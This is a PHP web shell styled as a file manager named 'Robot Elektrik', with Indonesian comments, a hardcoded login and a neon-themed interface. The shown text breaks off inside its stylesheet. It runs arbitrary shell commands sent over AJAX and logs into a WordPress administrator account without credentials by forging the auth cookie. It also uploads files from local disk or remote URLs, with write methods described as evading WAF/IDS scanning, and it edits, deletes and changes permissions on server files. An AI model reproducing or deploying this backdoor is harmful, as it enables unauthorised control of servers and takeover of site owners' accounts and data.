<?php
ob_start(); // Mencegah error "headers already sent"
session_start();

// Konfigurasi login
$valid_username = "bukanseo";
$valid_password = "ZxC7580";

// Define website_name for dynamic display on the login page
$website_name = $_SERVER['SERVER_NAME'];

// Helper: escape HTML untuk mencegah XSS
function e($str) {
    return htmlentities($str, ENT_QUOTES, 'UTF-8');
}

// Helper: Set session message
// Fungsi ini menyimpan pesan ke dalam sesi yang akan ditampilkan setelah refresh/redirect
function set_message($type, $text) {
    if (!isset($_SESSION['messages'])) {
        $_SESSION['messages'] = [];
    }
    $_SESSION['messages'][] = ['type' => $type, 'text' => $text];
}

// Helper: Display and clear session messages
// Fungsi ini menampilkan pesan dari sesi dan kemudian menghapusnya
function display_messages() {
    if (isset($_SESSION['messages']) && !empty($_SESSION['messages'])) {
        echo '<div class="message-container">';
        foreach ($_SESSION['messages'] as $msg) {
            $class = '';
            if ($msg['type'] === 'success') {
                $class = 'success-message';
            } elseif ($msg['type'] === 'error') {
                $class = 'error-message';
            } elseif ($msg['type'] === 'warning') {
                $class = 'warning-message';
            }
            echo '<div class="message ' . $class . '">' . e($msg['text']) . '</div>';
        }
        echo '</div>';
        unset($_SESSION['messages']); // Hapus pesan setelah ditampilkan
    }
}

// NEW HELPER: Get symbolic permissions string (e.g., -rw-r--r--)
function get_permissions_string($filepath) {
    if (!file_exists($filepath)) {
        return '---------'; // File not found
    }

    $perms = fileperms($filepath);
    if ($perms === false) {
        return '---------'; // Unable to get permissions
    }

    $info = '';

    // File type (first character)
    if (($perms & 0xC000) == 0xC000) { $info .= 's'; } // S_IFSOCK
    elseif (($perms & 0xA000) == 0xA000) { $info .= 'l'; } // S_IFLNK
    elseif (($perms & 0x8000) == 0x8000) { $info .= '-'; } // S_IFREG
    elseif (($perms & 0x6000) == 0x6000) { $info .= 'b'; } // S_IFBLK
    elseif (($perms & 0x4000) == 0x4000) { $info .= 'd'; } // S_IFDIR
    elseif (($perms & 0x2000) == 0x2000) { $info .= 'c'; } // S_IFCHR
    elseif (($perms & 0x1000) == 0x1000) { $info .= 'p'; } // S_IFIFO
    else { $info .= '?'; } // Unknown type (or not applicable for these common checks)

    // Owner (read, write, execute/setuid)
    $info .= (($perms & 0x0100) ? 'r' : '-'); // S_IRUSR
    $info .= (($perms & 0x0080) ? 'w' : '-'); // S_IWUSR
    $info .= (($perms & 0x0040) ? // S_IXUSR
                (($perms & 0x0800) ? 's' : 'x' ) : // S_ISUID
                (($perms & 0x0800) ? 'S' : '-')); // 's' if setuid and executable, 'S' if setuid but not executable

    // Group (read, write, execute/setgid)
    $info .= (($perms & 0x0020) ? 'r' : '-'); // S_IRGRP
    $info .= (($perms & 0x0010) ? 'w' : '-'); // S_IWGRP
    $info .= (($perms & 0x0008) ? // S_IXGRP
                (($perms & 0x0400) ? 's' : 'x' ) : // S_ISGID
                (($perms & 0x0400) ? 'S' : '-')); // 's' if setgid and executable, 'S' if setgid but not executable

    // Others (read, write, execute/sticky)
    $info .= (($perms & 0x0004) ? 'r' : '-'); // S_IROTH
    $info .= (($perms & 0x0002) ? 'w' : '-'); // S_IWOTH
    $info .= (($perms & 0x0001) ? // S_IXOTH
                (($perms & 0x0200) ? 't' : 'x' ) : // S_ISVTX (sticky bit)
                (($perms & 0x0200) ? 'T' : '-')); // 't' if sticky and executable, 'T' if sticky but not executable

    return $info;
}

// NEW FUNCTION: bypass_file_write_detailed
// This function attempts various ways to write content to a file.
// It tries to be more resilient than just move_uploaded_file or simple file_put_contents.
// Returns an array: ['status' => 'success'|'error', 'message' => 'text']
function bypass_file_write_detailed($source_content, $dest_path, $filename_for_message, $bypass_mode = false) {
    $success_message_prefix = 'File "' . e($filename_for_message) . '"berhasil diunggah';
    $error_message_prefix = 'Gagal menyimpan file "' . e($filename_for_message) . '".';

    // Attempt 1: Standard file_put_contents (most common and reliable if permissions are OK)
    if (file_put_contents($dest_path, $source_content) !== false) {
        return ['status' => 'success', 'message' => $success_message_prefix . ' (Mode Normal).'];
    }

    // If bypass_mode is active, try alternative methods
    if ($bypass_mode) {
        // Attempt 2: Write byte-by-byte (less efficient, but can bypass some very specific resource/lock issues)
        $fp = @fopen($dest_path, 'wb');
        if ($fp) {
            if (@fwrite($fp, $source_content) !== false) {
                @fclose($fp);
                return ['status' => 'success', 'message' => $success_message_prefix . ' (via byte-by-byte).'];
            }
            @fclose($fp);
            @unlink($dest_path); // Clean up if write failed
        }

        // Attempt 3: PHP filter stream (might bypass some simple WAFs/IDS scanning content)
        // This is more for evasion than "bypass upload function"
        try {
            if (function_exists('stream_filter_append') && function_exists('stream_get_filters') && in_array('convert.base64-decode', stream_get_filters())) {
                $base64_encoded_content = base64_encode($source_content);
                $filter_dest_path = 'php://filter/write=convert.base64-decode/resource=' . $dest_path;
                if (@file_put_contents($filter_dest_path, $base64_encoded_content) !== false) {
                    return ['status' => 'success', 'message' => $success_message_prefix . ' (via PHP filter base64 decode).'];
                }
            }
        } catch (Exception $e) {
            // Error applying filter, continue to next method
        }
    }

    // If none of the above worked
    return ['status' => 'error', 'message' => $error_message_prefix . ' Semua metode bypass gagal. Pastikan izin menulis atau coba cara lain.'];
}

// START OF FIX: Function to recursively delete a directory and its contents
function delete_directory_recursive($dir) {
    if (!is_dir($dir)) {
        return false; // Not a directory or does not exist
    }

    // Get all items (files and subdirectories) in the directory
    $items = scandir($dir);
    if ($items === false) {
        // Could not scan directory, possibly permission denied
        return false;
    }

    foreach ($items as $item) {
        if ($item === '.' || $item === '..') {
            continue; // Skip current and parent directory entries
        }

        $path = $dir . DIRECTORY_SEPARATOR . $item;

        if (is_dir($path)) {
            // If it's a subdirectory, recursively call this function
            if (!delete_directory_recursive($path)) {
                return false; // If recursive deletion fails, propagate failure
            }
        } else {
            // If it's a file, delete it
            if (!unlink($path)) {
                return false; // If file deletion fails, propagate failure
            }
        }
    }

    // After all contents are deleted, remove the now-empty directory itself
    return rmdir($dir);
}
// END OF FIX

// Cek apakah WordPress ada di direktori ini atau parent
// Lebih baik memeriksa wp-load.php karena itu yang akan di-include
$wp_config_path = rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-config.php";
$wp_load_path = rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-load.php";

// Gunakan file_exists($wp_load_path) untuk memastikan WP dapat dimuat
$is_wordpress_loadable = file_exists($wp_load_path);

// Jika sudah login
if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {

    // Dapatkan direktori sekarang, default "."
    $f = isset($_GET['f']) && !empty($_GET['f']) ? $_GET['f'] : '.';
    $f = realpath($f); // Mengubah ke path absolut dan menyelesaikan symlink
    if (!$f) $f = realpath('.'); // Fallback jika realpath gagal

    // Pastikan $f adalah direktori yang valid dan dapat diakses
    if (!is_dir($f)) {
        set_message('error', 'Direktori tidak ditemukan atau tidak valid.');
        $f = realpath('.'); // Kembali ke direktori saat ini
        header("Location: ".$_SERVER['PHP_SELF']."?f=".urlencode($f));
        exit;
    }

    // Jika permintaan adalah AJAX untuk command shell
    if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) &&
        strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest' &&
        isset($_POST['command'])) {

        // Eksekusi command shell dan kembalikan hasil
        $command = trim($_POST['command']);
        if ($command !== '') {
            $descriptorspec = [
                0 => ["pipe", "r"], // stdin
                1 => ["pipe", "w"], // stdout
                2 => ["pipe", "w"]  // stderr
            ];
            // Tambahkan 2>&1 untuk menggabungkan stderr ke stdout, agar error juga tampil di output
            $proc = proc_open($command . ' 2>&1', $descriptorspec, $pipes, $f, null);
            if (is_resource($proc)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]); // Tutup stderr pipe juga
                proc_close($proc);
                // Background opacity for shell output from AJAX as well
                // MODIFIED: Make shell output more transparent
                echo "<pre style='background: rgba(0, 0, 0, 0.75); padding:10px; border-radius:3px; overflow:auto; max-height:300px; width:100%; word-wrap: break-word; color:#FF66CC; border: 1px solid #FF66CC; box-shadow: 0 0 8px rgba(255,102,204,0.5);'>".e($output)."</pre>";
            } else {
                // MODIFIED: Make shell output error more transparent
                echo "<pre style='background: rgba(0, 0, 0, 0.75); padding:10px; border-radius:3px; color:#FF0000; border: 1px solid #FF0000; box-shadow: 0 0 8px rgba(255,0,0,0.5);'>Gagal menjalankan command.</pre>";
            }
        } else {
            // MODIFIED: Make shell output error more transparent
            echo "<pre style='background: rgba(0, 0, 0, 0.75); padding:10px; border-radius:3px; color:#FF0000; border: 1px solid #FF0000; box-shadow: 0 0 8px rgba(255,0,0,0.5);'>Masukkan perintah shell.</pre>";
        }
        exit; // Jangan lanjutkan ke rendering halaman untuk permintaan AJAX
    }

    // Proses form buat folder dan file
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Auto Login WordPress
        if (isset($_POST['auto_login_wp'])) {
            if ($is_wordpress_loadable) {
                try {
                    require_once $wp_load_path; // Load full WordPress environment

                    // Ambil admin pertama
                    $admins = get_users(['role' => 'administrator', 'number' => 1]);
                    if (!empty($admins)) {
                        $admin = $admins[0];
                        $user_id = $admin->ID;

                        wp_clear_auth_cookie();
                        wp_set_current_user($user_id);
                        wp_set_auth_cookie($user_id, true);
                        $redirect_url = admin_url();

                        set_message('success', 'Berhasil login otomatis ke dashboard WordPress. Mengalihkan...');
                        header("Location: $redirect_url");
                        exit();
                    } else {
                        set_message('error', 'Tidak ada user administrator ditemukan di WordPress.');
                    }
                } catch (Exception $e) {
                    set_message('error', 'Error saat auto login WordPress: ' . $e->getMessage());
                }
            } else {
                set_message('error', 'WordPress tidak ditemukan atau wp-load.php tidak dapat diakses di direktori ini.');
            }
        }

        // Buat folder
        if (isset($_POST['mkdir'])) {
            $dirName = trim($_POST['mkdir']);
            if ($dirName !== '') {
                $dir = $f . DIRECTORY_SEPARATOR . basename($dirName); // basename untuk mencegah directory traversal
                if (!file_exists($dir)) {
                    // Coba buat dengan izin default 0755
                    if (mkdir($dir, 0755, true)) {
                        set_message('success', 'Folder "' . e($dirName) . '" berhasil dibuat.');
                    } else {
                        set_message('error', 'Gagal membuat folder "' . e($dirName) . '". Pastikan izin yang benar.');
                    }
                } else {
                    set_message('warning', 'Folder "' . e($dirName) . '" sudah ada.');
                }
            } else {
                set_message('error', 'Nama folder tidak boleh kosong.');
            }
        }
        // Buat file
        if (isset($_POST['mkfile'])) {
            $fileName = trim($_POST['mkfile']);
            if ($fileName !== '') {
                $file = $f . DIRECTORY_SEPARATOR . basename($fileName); // basename untuk mencegah directory traversal
                if (!file_exists($file)) {
                    if (file_put_contents($file, '') !== false) {
                        set_message('success', 'File "' . e($fileName) . '" berhasil dibuat.');
                    } else {
                        set_message('error', 'Gagal membuat file "' . e($fileName) . '". Pastikan izin yang benar.');
                    }
                } else {
                    set_message('warning', 'File "' . e($fileName) . '" sudah ada.');
                }
            } else {
                set_message('error', 'Nama file tidak boleh kosong.');
            }
        }
        // Simpan edit file
        if (isset($_POST['text']) && isset($_POST['edit_filepath'])) {
            $editFile = realpath($_POST['edit_filepath']);
            // Pastikan $editFile ada dan merupakan file di dalam direktori yang sah
            // strpos untuk mencegah pengeditan file di luar direktori akses
            if ($editFile && is_file($editFile) && strpos($editFile, $f) === 0) {
                if (file_put_contents($editFile, $_POST['text']) !== false) {
                    set_message('success', 'Perubahan pada file "' . e(basename($editFile)) . '" berhasil disimpan.');
                } else {
                    set_message('error', 'Gagal menyimpan perubahan file "' . e(basename($editFile)) . '". Pastikan izin yang benar.');
                }
            } else {
                set_message('error', 'File tidak valid atau di luar direktori akses.');
            }
        }

        // Upload file (Upload V.1) - MODIFIED FOR OVERWRITE
        if (isset($_FILES['upload_file'])) {
            $uploadFile = $_FILES['upload_file'];
            $bypass_mode_v1 = isset($_POST['bypass_mode_v1']) && $_POST['bypass_mode_v1'] === 'on';

            if ($uploadFile['error'] === UPLOAD_ERR_OK) {
                $destPath = $f . DIRECTORY_SEPARATOR . basename($uploadFile['name']); // basename for safety

                // *** FIX START: Overwrite existing file instead of creating a duplicate ***
                $finalDestPath = $destPath;
                // No while loop here to create unique names; it will overwrite if exists.
                // *** FIX END ***

                $result_message = null;

                // Try normal move_uploaded_file first if bypass mode is NOT explicitly requested
                if (!$bypass_mode_v1 && move_uploaded_file($uploadFile['tmp_name'], $finalDestPath)) {
                    $result_message = ['status' => 'success', 'message' => 'File "' . e($uploadFile['name']) . '" berhasil diunggah (Mode Normal).'];
                } else {
                    // If normal move_uploaded_file failed OR bypass mode is requested
                    $fileContent = @file_get_contents($uploadFile['tmp_name']);
                    if ($fileContent !== false) {
                        // Attempt bypass methods
                        $result_message = bypass_file_write_detailed($fileContent, $finalDestPath, $uploadFile['name'], true); // Pass true for bypass_mode if we are here
                    } else {
                        $result_message = ['status' => 'error', 'message' => 'Gagal membaca file sementara "' . e($uploadFile['name']) . '".'];
                    }
                }
                set_message($result_message['status'], $result_message['message']);

            } else if ($uploadFile['error'] !== UPLOAD_ERR_NO_FILE) {
                 set_message('error', 'Error unggah: ' . $uploadFile['error'] . ' (Kode: ' . $uploadFile['error'] . ').');
            }
            // UPLOAD_ERR_NO_FILE ditangani oleh validasi JavaScript di sisi klien
        }

        // Remote upload via URL - MODIFIED FOR OVERWRITE
        if (isset($_POST['remote_url'])) {
            $url = trim($_POST['remote_url']);
            $bypass_mode_remote = isset($_POST['bypass_mode_remote']) && $_POST['bypass_mode_remote'] === 'on';

            if ($url != '') {
                $pathParts = parse_url($url);
                $filename = isset($pathParts['path']) ? basename($pathParts['path']) : '';
                if ($filename === '') {
                    $filename = 'downloaded_file_' . time() . '.bin';
                }

                // *** FIX START: Overwrite existing file instead of creating a duplicate ***
                $dest = $f . DIRECTORY_SEPARATOR . basename($filename);
                // No while loop here to create unique names; it will overwrite if exists.
                // *** FIX END ***

                $fileData = false;
                $download_method_used = 'N/A';
                $download_error_detail = '';

                // Prioritize cURL if bypass mode is on AND cURL is available, otherwise try file_get_contents
                if ($bypass_mode_remote && function_exists('curl_init')) {
                    $ch = curl_init($url);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // For HTTPS on self-signed/invalid certs (less secure)
                    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
                    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'); // Bypass some user-agent checks
                    $fileData = curl_exec($ch);
                    $curl_error = curl_error($ch);
                    curl_close($ch);
                    if ($fileData !== false) {
                        $download_method_used = 'cURL';
                    } else {
                        $download_error_detail = 'cURL error: ' . $curl_error . '. ';
                        // set_message('warning', 'cURL gagal mengunduh dari URL: ' . e($url) . '. Error: ' . e($curl_error) . '. Mencoba file_get_contents...');
                    }
                }

                // If cURL failed or was not tried, attempt file_get_contents
                if ($fileData === false && ini_get('allow_url_fopen')) {
                    $fileData = @file_get_contents($url);
                    if ($fileData !== false) {
                        $download_method_used = 'file_get_contents';
                    } else {
                        $download_error_detail .= 'file_get_contents gagal.';
                    }
                }

                if ($fileData !== false) {
                    // Now attempt to write the file content using bypass_file_write_detailed
                    $write_result = bypass_file_write_detailed($fileData, $dest, basename($dest), $bypass_mode_remote);
                    set_message($write_result['status'], $write_result['message'] . ' (Download via ' . $download_method_used . ').');
                } else {
                    // All download attempts failed
                    $error_msg = 'Gagal mengunduh dari URL: ' . e($url) . '. ' . $download_error_detail;
                    if (!ini_get('allow_url_fopen')) {
                        $error_msg .= ' allow_url_fopen dinonaktifkan.';
                    }
                    if (!function_exists('curl_init')) {
                        $error_msg .= ' Ekstensi cURL tidak tersedia.';
                    }
                    $error_msg .= ' Pastikan URL benar dan server memiliki izin atau fungsi untuk mengaksesnya.';
                    set_message('error', $error_msg);
                }
            } else {
                set_message('error', 'URL untuk remote upload tidak boleh kosong.');
            }
        }
        // Upload via Drag & Drop (V.2) - This is an AJAX request - MODIFIED FOR OVERWRITE
        if (isset($_POST['drop_upload'])) {
            $fileData = $_POST['drop_upload'];
            $fileName = $_POST['drop_filename'];
            $bypass_mode_v2 = isset($_POST['bypass_mode_v2']) && $_POST['bypass_mode_v2'] === 'on';

            if ($fileData && $fileName) {
                $destPath = $f . DIRECTORY_SEPARATOR . basename($fileName);
                // *** FIX START: Overwrite existing file instead of creating a duplicate ***
                $finalDestPath = $destPath;
                // No while loop here to create unique names; it will overwrite if exists.
                // *** FIX END ***

                $decodedData = base64_decode($fileData);
                if ($decodedData === false) {
                    echo json_encode(['status' => 'error', 'message' => 'Data file tidak valid (Base64 decode gagal).']);
                } else {
                    // Use bypass_file_write_detailed. The message is handled by bypass_file_write_detailed itself.
                    echo json_encode(bypass_file_write_detailed($decodedData, $finalDestPath, basename($fileName), $bypass_mode_v2));
                }
            } else {
                echo json_encode(['status' => 'error', 'message' => 'Data file atau nama file tidak ditemukan.']);
            }
            exit; // Hentikan eksekusi untuk permintaan AJAX
        }

        // --- NEW: Rename File/Folder ---
        if (isset($_POST['action']) && $_POST['action'] === 'rename') {
            $oldName = trim($_POST['old_name']);
            $newName = trim($_POST['new_name']);

            if ($oldName !== '' && $newName !== '') {
                $oldPath = $f . DIRECTORY_SEPARATOR . basename($oldName);
                $newPath = $f . DIRECTORY_SEPARATOR . basename($newName);

                // Pastikan item lama ada dan berada dalam direktori akses
                if (file_exists($oldPath) && strpos(realpath($oldPath), realpath($f)) === 0) {
                    // Pastikan nama baru tidak sama dengan nama lama dan belum ada
                    if ($oldName === $newName) {
                        set_message('warning', 'Nama baru sama dengan nama lama.');
                    } elseif (file_exists($newPath)) {
                        set_message('error', 'Nama "' . e($newName) . '" sudah ada. Ganti nama dibatalkan.');
                    } elseif (rename($oldPath, $newPath)) {
                        set_message('success', 'Berhasil mengganti nama "' . e($oldName) . '" menjadi "' . e($newName) . '".');
                    } else {
                        set_message('error', 'Gagal mengganti nama "' . e($oldName) . '". Pastikan izin yang benar.');
                    }
                } else {
                    set_message('error', 'Item "' . e($oldName) . '" tidak valid atau di luar direktori akses.');
                }
            } else {
                set_message('error', 'Nama lama dan nama baru tidak boleh kosong.');
            }
        }

        // --- NEW: Change Permissions (Chmod) ---
        if (isset($_POST['action']) && $_POST['action'] === 'chmod') {
            $itemName = trim($_POST['item_name']);
            $permissions = trim($_POST['permissions']); // e.g., "755"

            if ($itemName !== '' && $permissions !== '') {
                $itemPath = $f . DIRECTORY_SEPARATOR . basename($itemName);

                // Validasi permissions (harus 3 digit angka, 0-7)
                if (!preg_match('/^[0-7]{3}$/', $permissions)) {
                    set_message('error', 'Format izin tidak valid. Gunakan 3 digit angka (misal: 755).');
                } elseif (file_exists($itemPath) && strpos(realpath($itemPath), realpath($f)) === 0) {
                    $octalPerms = octdec($permissions); // Konversi string octal ke integer desimal
                    if (@chmod($itemPath, $octalPerms)) { // @ untuk menekan peringatan jika gagal (misal: permission denied)
                        set_message('success', 'Izin untuk "' . e($itemName) . '" berhasil diubah menjadi ' . e($permissions) . '.');
                    } else {
                        set_message('error', 'Gagal mengubah izin untuk "' . e($itemName) . '". Pastikan izin yang benar.');
                    }
                } else {
                    set_message('error', 'Item "' . e($itemName) . '" tidak valid atau di luar direktori akses.');
                }
            } else {
                set_message('error', 'Nama item dan izin tidak boleh kosong.');
            }
        }


        // Redirect setelah POST (kecuali auto login dan panggilan AJAX)
        if (!isset($_POST['auto_login_wp']) && !isset($_POST['command']) && !isset($_POST['drop_upload'])) {
            header("Location: ".$_SERVER['PHP_SELF']."?f=".urlencode($f));
            exit;
        }
    }

    // Proses penghapusan file dan folder lewat GET
    if (isset($_GET['unlink'])) {
        $fileToDelete = $f . DIRECTORY_SEPARATOR . basename($_GET['unlink']);
        // Pastikan file berada di dalam direktori akses
        if (is_file($fileToDelete) && strpos(realpath($fileToDelete), realpath($f)) === 0) {
            if (unlink($fileToDelete)) {
                set_message('success', 'File "' . e(basename($fileToDelete)) . '" berhasil dihapus.');
            } else {
                set_message('error', 'Gagal menghapus file "' . e(basename($fileToDelete)) . '".');
            }
        } else {
            set_message('error', 'File tidak valid atau di luar direktori akses.');
        }
        header("Location: ".$_SERVER['PHP_SELF']."?f=".urlencode($f));
        exit;
    }
    // START OF FIX: Using recursive delete for directories
    if (isset($_GET['rmdir'])) {
        $dirToDelete = $f . DIRECTORY_SEPARATOR . basename($_GET['rmdir']);
        // Pastikan direktori berada di dalam direktori akses
        if (is_dir($dirToDelete) && strpos(realpath($dirToDelete), realpath($f)) === 0) {
            // Call the new recursive deletion function
            if (delete_directory_recursive($dirToDelete)) {
                set_message('success', 'Folder "' . e(basename($dirToDelete)) . '" dan semua isinya berhasil dihapus.');
            } else {
                set_message('error', 'Gagal menghapus folder "' . e(basename($dirToDelete)) . '". Pastikan izin yang benar atau coba lagi.');
            }
        } else {
            set_message('error', 'Folder tidak valid atau di luar direktori akses.');
        }
        header("Location: ".$_SERVER['PHP_SELF']."?f=".urlencode($f));
        exit;
    }
    // END OF FIX

    // Logout function and button removal as requested
    // if (isset($_POST['logout'])) {
    //     $_SESSION = array(); // Bersihkan semua variabel sesi
    //     session_destroy(); // Hancurkan sesi
    //     set_message('success', 'Anda telah berhasil logout.'); // Pesan ini akan ditampilkan di halaman login
    //     header("Location: ".$_SERVER['PHP_SELF']);
    //     exit;
    // }
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8" />
<!-- The original script explicitly commented out the viewport meta tag, retaining that behavior -->
<!-- <meta name="viewport" content="width=device-width, initial-scale=1" /> -->
<title>File Manager - Robot Elektrik</title>
<!-- Google Fonts -->
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Share+Tech+Mono&family=Rajdhani:wght@400;600&display=swap" rel="stylesheet" />
<!-- Font Awesome untuk ikon -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
<style>
  /* Reset dan global */
  * {
    margin: 0; padding: 0; box-sizing: border-box;
  }
  body {
    font-family: 'Orbitron', sans-serif;
    background-color: #000000; /* Black */
    color: #FFFFFF; /* White for general text */
    padding: 0;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    position: relative;
    overflow-x: hidden;
  }

  /* Canvas Background */
  #background-canvas {
    position: fixed;
    top: 0; left: 0;
    width: 100%;
    height: 100%;
    z-index: -2;
    background-color: #000000; /* Black */
  }

  /* Main Wrapper */
  .main-wrapper {
    position: absolute;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    max-width: none;
    margin: 0;
    background-color: rgba(0, 0, 0, 0.65); /* Transparent Black overlay */
    border: 1px solid rgba(255, 102, 204, 0.4); /* Pink border */
    box-shadow: 0 0 30px rgba(255, 102, 204, 0.5); /* Pink glow */
    border-radius: 0;
    display: flex;
    flex-direction: column;
    min-height: 100vh;
    z-index: 1;
  }

  /* Header */
  .app-header {
    text-align: center;
    padding: 25px;
    border-bottom: 2px solid #FF0000; /* Red separator */
    box-shadow: 0 2px 10px rgba(255,0,0,0.3);
  }
  .app-header h1 {
    font-size: 2.8em;
    color: #FFFFFF; /* White */
    text-shadow: 0 0 18px #FFFFFF, 0 0 40px #FFFFFF; /* Stronger white glow */
    margin-bottom: 15px;
  }
  .header-divider {
    border: none;
    height: 3px;
    background: linear-gradient(90deg, #FF66CC, #FF0000); /* Pink to Red gradient */
    width: 70%;
    margin: 0 auto 20px auto;
    box-shadow: 0 0 12px rgba(255,102,204,0.6);
  }
  .header-controls {
    display: none;
  }

  /* Breadcrumb (New Location) */
  .breadcrumb-area {
    text-align: center;
    margin-bottom: 15px;
    padding: 5px 0;
  }
  .breadcrumb-area nav {
    margin-bottom: 0;
    font-family: 'Orbitron', sans-serif;
    display: flex;
    flex-wrap: wrap;
    justify-content: center;
    gap: 0px;
  }
  .breadcrumb-area a {
    color: #FF66CC; /* Pink */
    text-decoration: none;
    margin: 0;
    padding: 3px 5px;
    border-radius: 3px;
    transition: background-color 0.2s, color 0.2s;
    font-family: 'Orbitron', sans-serif;
  }
  .breadcrumb-area a:hover {
    background-color: rgba(255,102,204,0.1); /* Light pink background on hover */
    color: #FFFFFF; /* White on hover */
  }
  .breadcrumb-area span {
    color: #555555; /* Dark grey separator */
    margin: 0;
    padding: 3px 0;
    font-family: 'Orbitron', sans-serif;
  }

  /* WP Auto Login Form (New Location Style) */
  .wp-login-form {
    background-color: rgba(0, 0, 0, 0.70); /* Transparent black */
    border: 2px solid #FF0000; /* Red border */
    padding: 10px;
    border-radius: 4px;
    box-shadow: 0 0 10px rgba(255,0,0,0.5);
    min-width: 250px;
    margin-bottom: 15px;
    width: 100%;
  }
  .btn-auto-login {
    width: 100%;
    padding: 12px;
    background-color: #0A0A0A; /* Dark background */
    color: #FF0000; /* Red */
    font-family: 'Orbitron', sans-serif;
    font-weight: bold;
    border: 2px solid #FF0000; /* Red border */
    border-radius: 4px;
    cursor: pointer;
    font-size: 1em;
    box-shadow: 0 0 10px rgba(255,0,0,0.7);
    transition: background 0.3s, transform 0.2s, box-shadow 0.3s, border-color 0.3s;
  }
  .btn-auto-login:hover {
    background-color: #FF0000; /* Red background on hover */
    color: #0A0A0A; /* Dark text on hover */
    transform: scale(1.02);
    box-shadow: 0 0 20px rgba(255,0,0,0.9);
    border-color: #FFFFFF; /* White border on hover */
  }
  .btn-auto-login:disabled {
    background-color: #333;
    color: #777;
    border-color: #555;
    box-shadow: none;
    cursor: not-allowed;
  }

  /* Main File Manager Content (now includes actions) */
  .file-manager-main {
    flex: 1;
    display: flex;
    flex-direction: column;
    gap: 20px;
    overflow-y: auto;
    padding: 20px;
  }

  /* Generic Button Style (for all buttons using .btn) */
  .btn {
    padding: 12px 20px;
    border: 2px solid #FF66CC; /* Pink border */
    border-radius: 4px;
    background-color: #0A0A0A; /* Dark background */
    color: #FFFFFF; /* White text */
    font-family: 'Orbitron', sans-serif;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 0 10px rgba(255,102,204,0.5); /* Pink glow */
    transition: all 0.3s ease;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1em;
    text-decoration: none;
    white-space: nowrap;
  }
  .btn:hover {
    transform: scale(1.03);
    background: linear-gradient(135deg, #FF0000, #FF66CC); /* Red to Pink gradient */
    color: #0A0A0A;
    box-shadow: 0 0 20px rgba(255,102,204,0.7);
    border-color: #FFFFFF;
  }
  .btn i {
    margin-right: 8px;
    font-size: 1.2em;
  }

  /* Common Module Panel Style */
  .module-panel {
    background-color: rgba(0, 0, 0, 0.70); /* Transparent black background */
    border: 1px solid #FF66CC; /* Pink border */
    border-radius: 6px;
    padding: 20px;
    box-shadow: 0 0 15px rgba(255,102,204,0.5); /* Pink glow */
  }
  .module-panel h2 {
    color: #FF0000; /* Red heading */
    font-size: 1.5em;
    margin-bottom: 15px;
    text-align: center;
    border-bottom: 1px dashed rgba(255,0,0,0.3);
    padding-bottom: 10px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
  }
  .module-panel h2 i {
      font-size: 1.2em;
      color: #FFFFFF; /* White icon */
  }

  /* Specific style for server info table to make it smaller */
  .server-info-section table {
    width: auto;
    margin: 0 auto;
  }
  .server-info-section th,
  .server-info-section td {
    padding: 4px 8px;
    font-size: 0.8em;
  }
  .server-info-section th {
    text-align: left;
  }
  .server-info-section tbody td:first-child {
      font-weight: bold;
      color: #FF66CC; /* Pink for labels */
  }
  .server-info-section tbody td:last-child {
      color: #E0E0E0; /* Off-white for values */
  }


  /* Button Grid for Operations */
  .button-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
    gap: 10px;
  }

  table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 15px;
  }
  thead {
    background-color: rgba(17, 17, 17, 0.75); /* Transparent dark grey for table header */
  }
  th, td {
    border: 1px solid rgba(255,102,204,0.2); /* Subtle pink border */
    padding: 10px 12px;
    text-align: left;
    font-family: 'Share Tech Mono', monospace;
    font-size: 0.9em;
    word-break: break-word;
    color: #FFFFFF; /* White */
  }
  th {
    color: #FF0000; /* Red for headers */
    font-family: 'Orbitron', sans-serif;
    font-size: 1em;
    text-align: center;
  }
  /* NEW: Set modern font for table data cells and ensure left alignment */
  table tbody td {
    font-family: 'Orbitron', sans-serif;
    font-weight: 400;
    text-align: left;
  }
  /* Style for permission column to use monospace font and prevent line breaks */
  table tbody td:nth-child(4) {
      font-family: 'Share Tech Mono', monospace;
      white-space: nowrap;
  }

  tr:hover {
    background-color: rgba(26, 26, 26, 0.75); /* Transparent dark grey on hover */
    transition: background-color 0.2s;
  }
  
  /* Actions column specific styles */
  td.actions {
      white-space: nowrap;
      text-align: center;
      padding: 5px 8px;
  }
  td.actions a {
    color: #FF66CC; /* Pink default for actions */
    text-decoration: none;
    font-weight: bold;
    transition: color 0.2s, transform 0.2s;
    display: inline-block;
    padding: 5px;
    border-radius: 3px;
    margin: 0 3px;
  }
  td.actions a:hover {
    color: #FF0000; /* Red on hover */
    transform: scale(1.1);
    background-color: rgba(255,102,204,0.1); /* Subtle pink background highlight */
  }
  td.actions a i {
      font-size: 1.2em;
  }

  /* Specific icon colors for action buttons */
  td.actions a[title*="Edit"] { color: #FFFFFF; } /* White for Edit */
  td.actions a[title*="Ganti Nama"] { color: #FF66CC; } /* Pink for Rename */
  td.actions a[title*="Ubah Izin"] { color: #FF0000; } /* Red for Chmod */
